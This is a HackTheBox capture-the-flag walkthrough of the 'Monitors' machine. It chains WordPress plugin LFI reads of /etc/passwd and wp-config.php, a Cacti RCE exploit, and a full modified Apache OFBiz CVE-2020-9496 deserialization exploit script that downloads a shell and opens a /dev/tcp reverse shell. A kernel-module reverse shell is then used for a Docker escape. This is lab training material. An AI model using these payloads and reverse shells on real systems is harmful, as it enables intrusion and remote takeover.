# Monitors HTB

## Machine Information

- **Name**: Monitors
- **Platform**: HackTheBox
- **Difficulty**: Medium
- **OS**: Linux
- **Points**: 30

## Overview

Monitors is a medium-difficulty Linux machine that involves web application enumeration, WordPress and Cacti exploitation, and ultimately escaping from a Docker container to gain root access on the host system.

## Reconnaissance

### Initial Scan

```bash
export target=10.129.232.111

# TCP SYN scan to discover open ports
sudo nmap -p- --min-rate 1000 -sT -vvv $target

# Service version detection on discovered ports
sudo nmap -sC -sV -p 22,80 -T4 $target
```

<img width="329" height="197" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />

<img width="932" height="666" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />

<img width="776" height="387" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />

**Findings:**
- Port 22: SSH
- Port 80: HTTP service

### Web Enumeration

After discovering the web service, we add the domain to `/etc/hosts`:

```bash
echo "10.129.232.111 monitors.htb" >> /etc/hosts
```

<img width="551" height="206" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />


<img width="551" height="206" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />

Visiting `http://monitors.htb` reveals a WordPress installation.

<img width="963" height="779" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />

### WordPress Enumeration

```bash
wpscan --url http://monitors.htb -e ap
```

<img width="851" height="427" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />

**Critical Finding:** The `wp-with-spritz` plugin is installed and vulnerable to Local File Inclusion (LFI).

## Initial Access

### LFI Exploitation

The vulnerable endpoint allows directory traversal:

```bash
# Reading /etc/passwd to confirm LFI
curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd" | grep sh$
```

<img width="970" height="170" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />


**Key Discovery:** Two users with shell access: `root` and `marcus`.

### Virtual Host Discovery

```bash
# Reading Apache configuration
curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf"
```

<img width="964" height="754" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />

**Discovery:** Additional virtual host `cacti-admin.monitors.htb`

```bash
echo "10.129.232.111 cacti-admin.monitors.htb" >> /etc/hosts
```

### Credential Harvesting

```bash
# Reading WordPress configuration
curl "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../../var/www/wordpress/wp-config.php"
```

<img width="964" height="754" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />

**Credentials Found:**
- Database User: `wpadmin`
- Database Password: `BestAdministrator@2020!`

### Cacti Access

Using the discovered credentials:
- URL: `http://cacti-admin.monitors.htb/cacti/`
- Username: `admin`
- Password: `BestAdministrator@2020!`

## Privilege Escalation

### Cacti Exploitation

Cacti version 1.2.12 is vulnerable to authenticated remote code execution.


<img width="961" height="818" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />


```bash
searchsploit cacti 1.2.12
searchsploit -m 49810
```

<img width="957" height="173" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />

<img width="540" height="205" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />

**Exploit Execution:**
```bash
python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p 'BestAdministrator@2020!' --lhost 10.10.14.50 --lport 9001
```

<img width="957" height="316" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />

**Result:** Gained initial shell as `www-data` user.

<img width="522" height="208" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />

### Lateral Movement to Marcus

Discovery of backup service credentials:

```bash
cat /etc/systemd/system/cacti-backup.service
cat /home/marcus/.backup/backup.sh
```

<img width="721" height="264" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />

<img width="876" height="205" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />

**Credentials Found:**
- Password: `VerticalEdge2020`

**SSH Access:**
```bash
ssh marcus@10.129.232.111
```

<img width="658" height="910" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />

**User Flag:**
```bash
cat /home/marcus/user.txt
# 5a8502ebdfc41a5843153cf73bcd702d
```

## Container Escape

### Service Discovery

```bash
netstat -tunlp
```

<img width="822" height="292" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />

**Discovery:** OFBiz service running on localhost port 8443.

### SSH Port Forwarding

```bash
ssh -L 8443:127.0.0.1:8443 marcus@10.129.232.111
```

### OFBiz Enumeration

```bash
gobuster dir -u https://127.0.0.1:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
```

<img width="965" height="499" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />

**Discovery:** Apache OFBiz 17.12.01 running at `/catalog`

### OFBiz Exploitation

OFBiz 17.12.01 is vulnerable to deserialization attacks (CVE-2020-9496).

```bash
searchsploit OFBiz 17.12.01
searchsploit -m 50178
```

<img width="960" height="172" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-21-Upload-To-Imgur" />

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# Start HTTP server and netcat listener
python3 -m http.server 8000
nc -lnvp 9002

# Execute exploit
bash 50178.sh -i 10.10.14.50 -p 9002
```

**Modified Exploit Script:**

```bash
# 50178.sh
#!/usr/bin/env bash

# Exploit Title: Apache OfBiz 17.12.01 - Remote Command Execution (RCE)
# CVE: CVE-2020-9496
# Corrected version for HTB Monitors

url='https://127.0.0.1'
port=8443

function helpPanel(){
    echo -e "\nUsage:"
    echo -e "\t[-i] Attacker's IP"
    echo -e "\t[-p] Attacker's Port"
    echo -e "\t[-u] Target URL (default: https://127.0.0.1)"
    echo -e "\t[-r] Target Port (default: 8443)"
    echo -e "\t[-h] Show help pannel"
    exit 1
}

function ctrl_c(){
    echo -e "\n\n[!] Exiting...\n"
    exit 1
}

trap ctrl_c INT

function webRequest(){
    echo -e "\n[*] Creating a shell file with bash\n"
    echo -e "#!/bin/bash\n/bin/bash -i >& /dev/tcp/$ip/$ncport 0>&1" > shell.sh
    
    echo -e "[*] Checking for ysoserial..."
    # Check if ysoserial exists locally first
    if [ ! -f "ysoserial-all.jar" ]; then
        echo -e "[!] ysoserial-all.jar not found in current directory"
        echo -e "[*] Please ensure ysoserial-all.jar is in the current directory"
        echo -e "[*] You can get it from: https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
        exit 1
    fi
    
    echo -e "[*] Testing connection to target..."
    response_test=$(curl -s -k "$url:$port/webtools/control/xmlrpc" -w "%{http_code}" -o /dev/null)
    echo -e "[*] Target response code: $response_test"
    
    echo -e "[*] Generating first payload (download shell)..."
    # Use Java 11 with proper module exports
    payload=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
        --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
        --add-exports=java.base/sun.net.www.protocol.http=ALL-UNNAMED \
        -jar ysoserial-all.jar CommonsBeanutils1 "wget http://$ip:8000/shell.sh -O /tmp/shell.sh 2>/dev/null" 2>/dev/null | base64 -w 0)
    
    if [ -z "$payload" ]; then
        echo -e "[!] Failed to generate first payload with CommonsBeanutils1. Trying CommonsCollections2..."
        payload=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections2 "wget http://$ip:8000/shell.sh -O /tmp/shell.sh 2>/dev/null" 2>/dev/null | base64 -w 0)
    fi
    
    if [ -z "$payload" ]; then
        echo -e "[!] Failed to generate payload. Trying without module exports..."
        payload=$(java -jar ysoserial-all.jar CommonsBeanutils1 "wget http://$ip:8000/shell.sh -O /tmp/shell.sh 2>/dev/null" 2>/dev/null | base64 -w 0)
    fi
    
    if [ -z "$payload" ]; then
        echo -e "[!] All payload generation attempts failed!"
        echo -e "[*] Please check if ysoserial is working properly"
        exit 1
    fi
    
    echo -e "[+] Payload 1 generated successfully (length: ${#payload} chars)"
    
    echo -e "[*] Sending first payload to server... (Download)"
    response1=$(curl -s -k "$url:$port/webtools/control/xmlrpc" -X POST \
        -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" \
        -H 'Content-Type:application/xml' -w "%{http_code}")
    
    echo -e "[*] First request sent. Response code: ${response1: -3}"
    
    echo -e "[*] Waiting 3 seconds for download to complete..."
    sleep 3
    
    echo -e "[*] Generating second payload (execute shell)..."
    payload2=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
        --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
        --add-exports=java.base/sun.net.www.protocol.http=ALL-UNNAMED \
        -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" 2>/dev/null | base64 -w 0)
    
    if [ -z "$payload2" ]; then
        echo -e "[!] Failed to generate second payload with CommonsBeanutils1. Trying CommonsCollections2..."
        payload2=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections2 "bash /tmp/shell.sh" 2>/dev/null | base64 -w 0)
    fi
    
    if [ -z "$payload2" ]; then
        echo -e "[!] Failed to generate second payload. Trying without module exports..."
        payload2=$(java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" 2>/dev/null | base64 -w 0)
    fi
    
    if [ -z "$payload2" ]; then
        echo -e "[!] All payload generation attempts failed for second payload!"
        exit 1
    fi
    
    echo -e "[+] Payload 2 generated successfully (length: ${#payload2} chars)"
    
    echo -e "[*] Sending second payload to server... (Execute)"
    response2=$(curl -s -k "$url:$port/webtools/control/xmlrpc" -X POST \
        -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload2</serializable></value></member></struct></value></param></params></methodCall>" \
        -H 'Content-Type:application/xml' -w "%{http_code}")
    
    echo -e "[*] Second request sent. Response code: ${response2: -3}"
    echo -e "\n[+] Exploit completed! Check your netcat listener for a shell!"
    echo -e "[*] If no shell appears, the target might be:"
    echo -e "    - Blocking outbound connections"
    echo -e "    - Not executing the payload"
    echo -e "    - Requiring a different payload/gadget chain"
}

# Main execution
declare -i parameter_enable=0

while getopts ":i:p:u:r:h" arg; do
    case $arg in
        i) ip=$OPTARG; let parameter_enable+=1;;
        p) ncport=$OPTARG; let parameter_enable+=1;;
        u) url=$OPTARG;;
        r) port=$OPTARG;;
        h) helpPanel;;
    esac
done

if [ $parameter_enable -ne 2 ]; then
    helpPanel
else
    webRequest
fi
```

<img width="523" height="451" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-22-Upload-To-Imgur" />

<img width="661" height="232" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-23-Upload-To-Imgur" />

**Result:** Gained access to Docker container as root.

### Kernel Module Exploitation

**Kernel Module Code:**
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.50/1337 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

**Makefile:**
```makefile
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/4.15.0-151-generic/build M=/root modules
clean:
	make -C /lib/modules/4.15.0-151-generic/build M=/root clean
```

**Execution:**
```bash
# Transfer files to container
wget http://10.10.14.50:8000/reverse-shell.c
wget http://10.10.14.50:8000/Makefile

# Compile and execute
make
nc -nlvp 1337
insmod reverse-shell.ko
```

<img width="674" height="435" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-24-Upload-To-Imgur" />

<img width="584" height="243" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-25-Upload-To-Imgur" />

<img width="638" height="953" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-26-Upload-To-Imgur" />

**Root Flag:**
```bash
cat /root/root.txt
# 9fe02d0b7f6bda0b0cdf6b084722768d
```

## Lessons Learned

### Security Misconfigurations

1. **WordPress Plugin Vulnerability**: Outdated plugins with known vulnerabilities
2. **Information Disclosure**: WordPress configuration file accessible via LFI
3. **Password Reuse**: Same credentials across multiple services
4. **Vulnerable Services**: Unpatched Cacti and OFBiz installations
5. **Container Security**: Excessive capabilities in Docker container

### Defense Recommendations

- Regular security updates for all software components
- Principle of least privilege for service accounts
- Unique credentials across different services
- Proper container security hardening
- Input validation and sanitization for web applications

### Tools Used

- Nmap
- WPScan
- SearchSploit
- Gobuster
- Ysoserial
- Netcat
- GCC compiler suite

---

**Note**: This walkthrough is for educational purposes only. Always ensure you have proper authorization before testing security vulnerabilities.

---
*Hack The Box - Monitors | Complete Walkthrough*
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
